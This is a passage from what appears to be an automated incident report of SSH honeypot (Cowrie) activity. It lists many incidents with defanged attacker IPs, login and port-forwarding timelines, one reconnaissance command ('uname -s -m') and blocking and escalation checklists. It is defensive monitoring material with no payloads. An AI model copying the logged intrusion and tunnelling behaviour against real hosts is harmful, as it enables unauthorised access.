| `2026-08-24 01:39:55` | `cowrie.client.version` |
| `2026-08-24 01:39:55` | `cowrie.client.kex` |
| `2026-08-24 01:39:57` | `cowrie.login.success` |
| `2026-08-24 01:39:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bec056e3ab8a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:40 |
| **Last Seen** | 2026-08-24 01:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:40:35` | `cowrie.session.connect` |
| `2026-08-24 01:40:35` | `cowrie.client.version` |
| `2026-08-24 01:40:35` | `cowrie.client.kex` |
| `2026-08-24 01:40:36` | `cowrie.login.success` |
| `2026-08-24 01:40:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:40:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:40:37` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d947733783

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:40 |
| **Last Seen** | 2026-08-24 01:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:40:39` | `cowrie.session.connect` |
| `2026-08-24 01:40:39` | `cowrie.client.version` |
| `2026-08-24 01:40:39` | `cowrie.client.kex` |
| `2026-08-24 01:40:40` | `cowrie.login.success` |
| `2026-08-24 01:40:40` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:40:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:40:40` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2cdb55627ba

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:50 |
| **Last Seen** | 2026-08-24 01:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:50:08` | `cowrie.session.connect` |
| `2026-08-24 01:50:08` | `cowrie.client.version` |
| `2026-08-24 01:50:08` | `cowrie.client.kex` |
| `2026-08-24 01:50:09` | `cowrie.login.success` |
| `2026-08-24 01:50:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:50:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:50:09` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a2694dca12

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:50 |
| **Last Seen** | 2026-08-24 01:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:50:12` | `cowrie.session.connect` |
| `2026-08-24 01:50:12` | `cowrie.client.version` |
| `2026-08-24 01:50:12` | `cowrie.client.kex` |
| `2026-08-24 01:50:13` | `cowrie.login.success` |
| `2026-08-24 01:50:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:50:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:50:13` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-868cd06674b0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 01:55 |
| **Last Seen** | 2026-08-24 01:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:55:45` | `cowrie.session.connect` |
| `2026-08-24 01:55:45` | `cowrie.client.version` |
| `2026-08-24 01:55:45` | `cowrie.client.kex` |
| `2026-08-24 01:55:46` | `cowrie.login.success` |
| `2026-08-24 01:55:46` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:55:46` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effac3505ed2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:59 |
| **Last Seen** | 2026-08-24 01:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:59:42` | `cowrie.session.connect` |
| `2026-08-24 01:59:42` | `cowrie.client.version` |
| `2026-08-24 01:59:42` | `cowrie.client.kex` |
| `2026-08-24 01:59:43` | `cowrie.login.success` |
| `2026-08-24 01:59:43` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:59:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:59:44` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daa99041fd8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:59 |
| **Last Seen** | 2026-08-24 01:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:59:46` | `cowrie.session.connect` |
| `2026-08-24 01:59:46` | `cowrie.client.version` |
| `2026-08-24 01:59:46` | `cowrie.client.kex` |
| `2026-08-24 01:59:47` | `cowrie.login.success` |
| `2026-08-24 01:59:47` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:59:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:59:47` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b450fa6e52fc

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-08-24 02:00 |
| **Last Seen** | 2026-08-24 02:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:00:23` | `cowrie.session.connect` |
| `2026-08-24 02:00:24` | `cowrie.client.version` |
| `2026-08-24 02:00:24` | `cowrie.client.kex` |
| `2026-08-24 02:00:27` | `cowrie.login.success` |
| `2026-08-24 02:00:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9fbdbdfc2d8

| Field | Detail |
|---|---|
| **Source IP** | `190.60.37[.]146` |
| **First Seen** | 2026-08-24 02:03 |
| **Last Seen** | 2026-08-24 02:03 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:03:10` | `cowrie.session.connect` |
| `2026-08-24 02:03:11` | `cowrie.client.version` |
| `2026-08-24 02:03:11` | `cowrie.client.kex` |
| `2026-08-24 02:03:17` | `cowrie.login.success` |
| `2026-08-24 02:03:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.37[.]146` to AbuseIPDB if not already reported
- [ ] Block `190.60.37[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452932faec32

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-08-24 02:03 |
| **Last Seen** | 2026-08-24 02:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:03:24` | `cowrie.session.connect` |
| `2026-08-24 02:03:25` | `cowrie.client.version` |
| `2026-08-24 02:03:25` | `cowrie.client.kex` |
| `2026-08-24 02:03:27` | `cowrie.login.success` |
| `2026-08-24 02:03:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2dad03c8c3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:09 |
| **Last Seen** | 2026-08-24 02:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:09:15` | `cowrie.session.connect` |
| `2026-08-24 02:09:15` | `cowrie.client.version` |
| `2026-08-24 02:09:15` | `cowrie.client.kex` |
| `2026-08-24 02:09:16` | `cowrie.login.success` |
| `2026-08-24 02:09:16` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:09:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:09:16` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd50be19ccac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:09 |
| **Last Seen** | 2026-08-24 02:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:09:19` | `cowrie.session.connect` |
| `2026-08-24 02:09:19` | `cowrie.client.version` |
| `2026-08-24 02:09:19` | `cowrie.client.kex` |
| `2026-08-24 02:09:20` | `cowrie.login.success` |
| `2026-08-24 02:09:20` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:09:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:09:20` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e15546526c52

| Field | Detail |
|---|---|
| **Source IP** | `190.60.37[.]146` |
| **First Seen** | 2026-08-24 02:11 |
| **Last Seen** | 2026-08-24 02:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:11:56` | `cowrie.session.connect` |
| `2026-08-24 02:11:56` | `cowrie.client.version` |
| `2026-08-24 02:11:56` | `cowrie.client.kex` |
| `2026-08-24 02:11:57` | `cowrie.login.success` |
| `2026-08-24 02:11:58` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.60.37[.]146` to AbuseIPDB if not already reported
- [ ] Block `190.60.37[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49efc13db52e

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-08-24 02:12 |
| **Last Seen** | 2026-08-24 02:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:12:07` | `cowrie.session.connect` |
| `2026-08-24 02:12:08` | `cowrie.client.version` |
| `2026-08-24 02:12:08` | `cowrie.client.kex` |
| `2026-08-24 02:12:09` | `cowrie.login.success` |
| `2026-08-24 02:12:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20f3ea51e431

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-24 02:12 |
| **Last Seen** | 2026-08-24 02:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:12:09` | `cowrie.session.connect` |
| `2026-08-24 02:12:09` | `cowrie.client.version` |
| `2026-08-24 02:12:09` | `cowrie.client.kex` |
| `2026-08-24 02:12:10` | `cowrie.login.success` |
| `2026-08-24 02:12:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247cf095ab85

| Field | Detail |
|---|---|
| **Source IP** | `2.184.158[.]56` |
| **First Seen** | 2026-08-24 02:12 |
| **Last Seen** | 2026-08-24 02:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:12:16` | `cowrie.session.connect` |
| `2026-08-24 02:12:16` | `cowrie.client.version` |
| `2026-08-24 02:12:16` | `cowrie.client.kex` |
| `2026-08-24 02:12:17` | `cowrie.login.success` |
| `2026-08-24 02:12:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.184.158[.]56` to AbuseIPDB if not already reported
- [ ] Block `2.184.158[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56562ea206ef

| Field | Detail |
|---|---|
| **Source IP** | `187.115.144[.]103` |
| **First Seen** | 2026-08-24 02:17 |
| **Last Seen** | 2026-08-24 02:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:17:13` | `cowrie.session.connect` |
| `2026-08-24 02:17:14` | `cowrie.client.version` |
| `2026-08-24 02:17:14` | `cowrie.client.kex` |
| `2026-08-24 02:17:16` | `cowrie.login.success` |
| `2026-08-24 02:17:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b49f88a524c9

| Field | Detail |
|---|---|
| **Source IP** | `60.220.241[.]50` |
| **First Seen** | 2026-08-24 02:17 |
| **Last Seen** | 2026-08-24 02:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:17:22` | `cowrie.session.connect` |
| `2026-08-24 02:17:23` | `cowrie.client.version` |
| `2026-08-24 02:17:23` | `cowrie.client.kex` |
| `2026-08-24 02:17:25` | `cowrie.login.success` |
| `2026-08-24 02:17:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.220.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.220.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60729bc02ecc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:18 |
| **Last Seen** | 2026-08-24 02:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:18:39` | `cowrie.session.connect` |
| `2026-08-24 02:18:39` | `cowrie.client.version` |
| `2026-08-24 02:18:39` | `cowrie.client.kex` |
| `2026-08-24 02:18:40` | `cowrie.login.success` |
| `2026-08-24 02:18:40` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:18:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:18:40` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63bc61017eee

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:18 |
| **Last Seen** | 2026-08-24 02:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:18:43` | `cowrie.session.connect` |
| `2026-08-24 02:18:43` | `cowrie.client.version` |
| `2026-08-24 02:18:43` | `cowrie.client.kex` |
| `2026-08-24 02:18:44` | `cowrie.login.success` |
| `2026-08-24 02:18:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:18:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:18:44` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57d6e3163c7f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:28 |
| **Last Seen** | 2026-08-24 02:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:28:12` | `cowrie.session.connect` |
| `2026-08-24 02:28:12` | `cowrie.client.version` |
| `2026-08-24 02:28:12` | `cowrie.client.kex` |
| `2026-08-24 02:28:13` | `cowrie.login.success` |
| `2026-08-24 02:28:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:28:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:28:13` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf7f28dc751c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:28 |
| **Last Seen** | 2026-08-24 02:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:28:16` | `cowrie.session.connect` |
| `2026-08-24 02:28:16` | `cowrie.client.version` |
| `2026-08-24 02:28:16` | `cowrie.client.kex` |
| `2026-08-24 02:28:17` | `cowrie.login.success` |
| `2026-08-24 02:28:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:28:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:28:17` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-665ec14b4b25

| Field | Detail |
|---|---|
| **Source IP** | `222.215.159[.]14` |
| **First Seen** | 2026-08-24 02:32 |
| **Last Seen** | 2026-08-24 02:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:32:27` | `cowrie.session.connect` |
| `2026-08-24 02:32:27` | `cowrie.client.version` |
| `2026-08-24 02:32:27` | `cowrie.client.kex` |
| `2026-08-24 02:32:28` | `cowrie.login.success` |
| `2026-08-24 02:32:29` | `cowrie.session.params` |
| `2026-08-24 02:32:29` | `cowrie.command.input` |
| `2026-08-24 02:32:29` | `cowrie.log.closed` |
| `2026-08-24 02:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.215.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `222.215.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f16d6b2e61d8

| Field | Detail |
|---|---|
| **Source IP** | `93.117.127[.]141` |
| **First Seen** | 2026-08-24 02:32 |
| **Last Seen** | 2026-08-24 02:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:32:28` | `cowrie.session.connect` |
